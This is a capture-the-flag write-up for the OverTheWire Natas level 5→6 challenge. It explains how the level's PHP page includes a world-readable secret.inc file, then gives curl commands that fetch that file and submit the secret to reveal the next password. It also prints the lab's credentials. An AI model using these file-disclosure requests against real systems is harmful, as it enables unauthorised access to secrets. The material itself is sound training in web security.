# Level 4 - Level 5: Natas - OverTheWire

## Level Goal

Username: natas6
URL:      http://natas6.natas.labs.overthewire.org

## Solution

Running `natas.sh` first, we can see an input form asking for a secret, as well as a link to view the sourcecode.

```html
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

When viewing the `/index-source.html` page, it is clear that this webserver is running PHP:

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

Essentially, this PHP code includes a file named `secret.inc` and checks if a user has entered the correct secret value. The `include` statement is used to include the contents of the file `includes/secret.inc`.

The `array_key_exists` function is used to check if the "submit" key exists in the `$_POST` array. The `$_POST` array is a special PHP variable that contains data submitted from an HTML form.

If the `submit` key exists in the `$_POST` array, the code then checks if the value of the `secret` key in the `$_POST` array matches the value of the `$secret` variable, which is defined in the included file `includes/secret.inc`.

To obtain the value of `$secret`, we can make a `curl` request to `http://natas6.natas.labs.overthewire.org/includes/secret.inc`:

```bash
└─$ curl -s -u natas6:fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR http://natas6.natas.labs.overthewire.org/includes/secret.inc
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

And with that, the `$secret` variable is revealed. We can now submit this value as a `POST` request to `http://natas6.natas.labs.overthewire.org/` to uncover the password for the next level.

```bash
└─$ curl -d "secret=FOEIUWGHFEEUHOFUOIU&submit=submit" -X POST http://natas6.natas.labs.overthewire.org/ -s -u natas6:fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR | grep password

Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

```

Brief command explanation:

* `curl -d`: Used to specify the data to send in a `POST` request to an HTTP server (similar to how the browser does this when you fill in an HTML form and press submit)
    * In this case, we are setting `secret=FOEIUWGH...`, separating by `&` and setting `submit=submit`

* `curl -X POST`: Used to specify the type of request, in this case `POST`
* `curl -s`: Silent output (avoid outputting progress bar)
